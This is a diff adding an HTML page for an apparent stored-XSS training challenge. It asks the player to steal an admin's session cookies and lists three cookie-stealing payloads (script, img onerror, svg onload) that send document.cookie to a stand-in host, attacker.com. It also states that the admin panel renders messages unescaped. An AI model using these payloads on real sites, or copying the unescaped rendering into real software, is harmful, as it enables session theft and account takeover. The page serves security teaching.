@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stored XSS Challenge</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            background-color: #222;
+            padding: 20px;
+            border-radius: 12px;
+            width: 500px;
+            margin: 0 auto 20px auto;
+            text-align: left;
+        }
+        .hints-container {
+            background-color: #111;
+            padding: 20px;
+            border-radius: 12px;
+            width: 500px;
+            margin: 0 auto;
+            text-align: left;
+        }
+        input, textarea, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+        input, textarea {
+            background-color: #333;
+            color: #fff;
+        }
+        button {
+            background-color: #444;
+            color: #fff;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #555;
+        }
+        .warning {
+            color: #ff5555;
+            border: 1px solid #ff5555;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        pre {
+            background-color: #333;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Stored XSS Challenge: Cookie Stealer</h1>
+
+
+
+    <h2>About Stored XSS Attacks</h2>
+    <p>Stored XSS (Persistent XSS) is particularly dangerous because:</p>
+    <ul>
+        <li>Malicious code is permanently stored on the server (database)</li>
+        <li>The attack executes when any user views the infected content</li>
+        <li>It can compromise admin accounts with elevated privileges</li>
+        <li>The attack persists until the malicious content is removed</li>
+    </ul>
+
+    <h3>Your Challenge</h3>
+    <p>Your goal is to:</p>
+    <ol>
+        <li>Submit a message containing malicious JavaScript</li>
+        <li>Have it execute when the admin views messages in the admin panel</li>
+        <li>Steal the admin's session cookies</li>
+    </ol>
+
+    <form method="POST">
+        <input type="text" name="username" placeholder="Enter your name" required>
+        <textarea name="message" placeholder="Enter your XSS payload here" required></textarea>
+        <button type="submit">Submit Message</button>
+    </form>
+</div>
+
+<div class="hints-container">
+    <h2>Cookie Stealing Hints</h2>
+    <p>Try these payloads to steal admin cookies:</p>
+
+    <h3>Basic Script Tag:</h3>
+    <pre>&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</pre>
+
+    <h3>Image Tag with Error Handler:</h3>
+    <pre>&lt;img src=x onerror="this.src='https://attacker.com/steal?cookie='+document.cookie"&gt;</pre>
+
+    <h3>SVG Tag:</h3>
+    <pre>&lt;svg onload="fetch('https://attacker.com/steal?cookie='+document.cookie)"&gt;&lt;/svg&gt;</pre>
+
+    <p>Remember: The admin panel will display your message exactly as submitted, allowing these XSS attacks to work.</p>
+</div>
+</body>
+</html>
